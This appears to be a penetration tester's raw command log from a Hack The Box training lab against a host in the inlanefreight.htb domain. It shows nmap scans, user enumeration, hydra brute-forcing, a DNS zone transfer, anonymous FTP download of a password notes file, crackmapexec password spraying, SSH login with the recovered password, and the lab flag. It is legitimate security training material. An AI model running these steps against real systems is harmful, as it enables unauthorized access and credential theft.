## LAB MEDIUM

nmap -sC -sV -oA nmap $TARGET --stats-every=5s

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 7108b0c4f3ca9757649770f9fec50c7b (RSA)
|   256 45c3b51463993d9eb32251e59776e150 (ECDSA)
|_  256 2ec2416646efb68195d5aa3523945538 (ED25519)
53/tcp   open  domain   ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.16.1-Ubuntu
110/tcp  open  pop3     Dovecot pop3d
|_pop3-capabilities: CAPA STLS USER PIPELINING RESP-CODES AUTH-RESP-CODE TOP SASL(PLAIN) UIDL
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2022-04-11T16:38:55
|_Not valid after:  2032-04-08T16:38:55
995/tcp  open  ssl/pop3 Dovecot pop3d
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2022-04-11T16:38:55
|_Not valid after:  2032-04-08T16:38:55
|_pop3-capabilities: UIDL RESP-CODES AUTH-RESP-CODE TOP CAPA USER SASL(PLAIN) PIPELINING
|_ssl-date: TLS randomness does not represent time
2121/tcp open  ftp
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (InlaneFTP) [10.129.201.127]
|     Invalid command: try being more creative
|     Invalid command: try being more creative
|   NULL: 
|_    220 ProFTPD Server (InlaneFTP) [10.129.201.127]
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port2121-TCP:V=7.93%I=7%D=11/22%Time=655E605D%P=x86_64-pc-linux-gnu%r(N
SF:ULL,31,"220\x20ProFTPD\x20Server\x20\(InlaneFTP\)\x20\[10\.129\.201\.12
SF:7\]\r\n")%r(GenericLines,8D,"220\x20ProFTPD\x20Server\x20\(InlaneFTP\)\
SF:x20\[10\.129\.201\.127\]\r\n500\x20Invalid\x20command:\x20try\x20being\
SF:x20more\x20creative\r\n500\x20Invalid\x20command:\x20try\x20being\x20mo
SF:re\x20creative\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


ftp $TARGET 2121
anonymous
530 Login incorrect.
Login failed.

sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 $TARGET

PORT    STATE  SERVICE    VERSION
25/tcp  closed smtp
110/tcp open   pop3       Dovecot pop3d
|_pop3-capabilities: TOP PIPELINING SASL(PLAIN) CAPA USER RESP-CODES AUTH-RESP-CODE UIDL STLS
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2022-04-11T16:38:55
|_Not valid after:  2032-04-08T16:38:55
|_ssl-date: TLS randomness does not represent time
143/tcp closed imap
465/tcp closed smtps
587/tcp closed submission
993/tcp closed imaps
995/tcp open   ssl/pop3   Dovecot pop3d
|_pop3-capabilities: TOP SASL(PLAIN) CAPA USER RESP-CODES AUTH-RESP-CODE UIDL PIPELINING
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2022-04-11T16:38:55
|_Not valid after:  2032-04-08T16:38:55
|_ssl-date: TLS randomness does not represent time

smtp-user-enum -M RCPT -U user.list -D inlanefreight.htb -t $TARGET

hydra -L user.list -P password.list ftp://$TARGET -s 2121
hydra -L user.list -P password.list -f $TARGET pop3
hydra -L user.list -P password.list  -f $TARGET smtp

sudo nmap -Pn -sV -sC -p22,53,110,995,2121 $TARGET --stats-every=5s

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 7108b0c4f3ca9757649770f9fec50c7b (RSA)
|   256 45c3b51463993d9eb32251e59776e150 (ECDSA)
|_  256 2ec2416646efb68195d5aa3523945538 (ED25519)
53/tcp   open  domain   ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.16.1-Ubuntu
110/tcp  open  pop3     Dovecot pop3d
|_pop3-capabilities: UIDL TOP CAPA SASL(PLAIN) PIPELINING STLS RESP-CODES USER AUTH-RESP-CODE
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2022-04-11T16:38:55
|_Not valid after:  2032-04-08T16:38:55
995/tcp  open  ssl/pop3 Dovecot pop3d
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2022-04-11T16:38:55
|_Not valid after:  2032-04-08T16:38:55
|_pop3-capabilities: SASL(PLAIN) CAPA PIPELINING UIDL AUTH-RESP-CODE RESP-CODES USER TOP
|_ssl-date: TLS randomness does not represent time
2121/tcp open  ftp      ProFTPD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

sudo nmap -Pn -sV -sC -A -p22,53,110,995,2121 $TARGET --stats-every=5s

sudo nmap $TARGET -p22,53,110,995,2121 -sV --script vuln

dig any inlanefreight.htb @$TARGET
ns.inlanefreight.htb

dig axfr inlanefreight.htb @$TARGET

inlanefreight.htb.	604800	IN	SOA	inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
inlanefreight.htb.	604800	IN	NS	ns.inlanefreight.htb.
app.inlanefreight.htb.	604800	IN	A	10.129.200.5
dc1.inlanefreight.htb.	604800	IN	A	10.129.100.10
dc2.inlanefreight.htb.	604800	IN	A	10.129.200.10
int-ftp.inlanefreight.htb. 604800 IN	A	127.0.0.1
int-nfs.inlanefreight.htb. 604800 IN	A	10.129.200.70
ns.inlanefreight.htb.	604800	IN	A	127.0.0.1
un.inlanefreight.htb.	604800	IN	A	10.129.200.142
ws1.inlanefreight.htb.	604800	IN	A	10.129.200.101
ws2.inlanefreight.htb.	604800	IN	A	10.129.200.102
wsus.inlanefreight.htb.	604800	IN	A	10.129.200.80
inlanefreight.htb.	604800	IN	SOA	inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800

dig axfr app.inlanefreight.htb @$TARGET

vi axfr.txt

app.inlanefreight.htb
dc1.inlanefreight.htb
dc2.inlanefreight.htb
int-ftp.inlanefreight.htb
ns.inlanefreight.htb
un.inlanefreight.htb
ws1.inlanefreight.htb
ws2.inlanefreight.htb
wsus.inlanefreight.htb

for sub in $(cat axfr.txt);do dig axfr $sub @$TARGET;done

sudo nmap -sC -sV -p 2121 $TARGET

sudo nmap -sV -p 2121 -sC -A $TARGET

crackmapexec ftp $TARGET --port 21

sudo nmap $TARGET -p- -sV --stats-every=5s

PORT      STATE SERVICE      VERSION
22/tcp    open  ssh          OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
53/tcp    open  domain       ISC BIND 9.16.1 (Ubuntu Linux)
110/tcp   open  pop3         Dovecot pop3d
995/tcp   open  ssl/pop3     Dovecot pop3d
2121/tcp  open  ccproxy-ftp?
30021/tcp open  ftp

sudo nmap -Pn -sV -sC -A -p30021 $TARGET --stats-every=5s

PORT      STATE SERVICE VERSION
30021/tcp open  ftp     ProFTPD
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x   2 ftp      ftp          4096 Apr 18  2022 simon

wget -m --no-passive ftp://anonymous:anonymous@$TARGET:30021

cat 10.129.201.127\:30021/simon/mynotes.txt 
234987123948729384293
+23358093845098
ThatsMyBigDog
Rock!ng#May
Puuuuuh7823328
8Ns8j1b!23hs4921smHzwn
237oHs71ohls18H127!!9skaP
238u1xjn1923nZGSb261Bs81

vi simon_password.list

crackmapexec ssh $TARGET -u simon -p simon_password.list

SSH         10.129.201.127  22     10.129.201.127   [+] simon:8Ns8j1b!23hs4921smHzwn 

ssh simon@$TARGET
8Ns8j1b!23hs4921smHzwn

cat flag.txt 
HTB{1qay2wsx3EDC4rfv_M3D1UM}